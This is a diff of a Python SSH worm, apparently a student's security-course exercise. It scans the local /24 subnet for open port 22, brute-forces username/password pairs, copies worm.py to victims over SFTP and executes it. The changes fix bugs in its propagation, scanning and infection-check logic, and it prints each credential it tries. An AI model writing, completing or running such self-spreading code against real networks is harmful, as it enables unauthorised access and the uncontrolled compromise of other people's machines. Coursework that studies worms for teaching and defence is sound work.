@@ -55,8 +55,9 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.
+	print "INFECT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("worm.py", "worm.py")
+	sftpClient.put("worm.py", "/tmp/worm.py")
 	sshClient.exec_command("chmod a+x worm.py")
 	sshClient.exec_command("./worm.py")
 	pass
@@ -94,10 +95,14 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-	connection_result = sshClient.connect(host, userName = userName, password = password)
-	if not connection_result:
+	print userName + "," + password + "," + host
+	try:
+		connection_result = sshClient.connect(host, username = userName, password = password)
+		print "good connection" 
+		return 0
+	except:
+		print "error connection"
 		return 1
-	return 0
 	pass
 
 ###############################################################
@@ -131,9 +136,10 @@ def attackSystem(host):
 		# victim. In this case we will
 		# return a tuple containing an
 		# instance of the SSH connection
-		# to the remote system.
+		# to the remote system.
 		attemptResults = tryCredentials(host, username, password, ssh)
-		if attemptResults:
+		print attemptResults
+		if attemptResults == 0:
 			return [ssh, username, password]
 	# Could not find working credentials
 	return None	
@@ -162,14 +168,17 @@ def getHostsOnTheSameNetwork():
 	# IP addresses.
 	interface_list = netinfo.list_devs()
 	portScanner = nmap.PortScanner()
-	x = portScanner.scan(getMyIP(interface_list[0]), arguments='-p 22 --open')
+	interface = ""
+	for i in interface_list:
+		if i == "enp0s3":
+			interface = i 
+	x = portScanner.scan(getMyIP(interface) + "/24",  arguments='-p 22 --open')
 	print interface_list
 	print "IP: "
-	print getMyIP(interface_list[0])
+	print getMyIP(interface)
 	print "\n"
 	print "x: "
 	print x
-	print "\n"
 	hostInfo = portScanner.all_hosts()
 	print "hostInfo: "
 	print hostInfo
@@ -210,7 +219,7 @@ if networkHosts is not None:
 		if host == myIp:
 			networkHosts.remove(host)
 
-	print "Found hosts: ", networkHosts
+	#print "Found hosts: ", networkHosts
 
 
 # Go through the network hosts
@@ -245,7 +254,8 @@ if networkHosts is not None:
 			# 	 # will throw IOError exception
 			# 	 # (that is, we know the system is
 			# 	 # not yet infected).
-				sftp.get(filepath, localpath)
+				sftpClient = sshInfo[0].open_sftp()
+				sftpClient.get(remotepath, localpath)
 			except IOError:
 				print "This system should be infected"
 			#
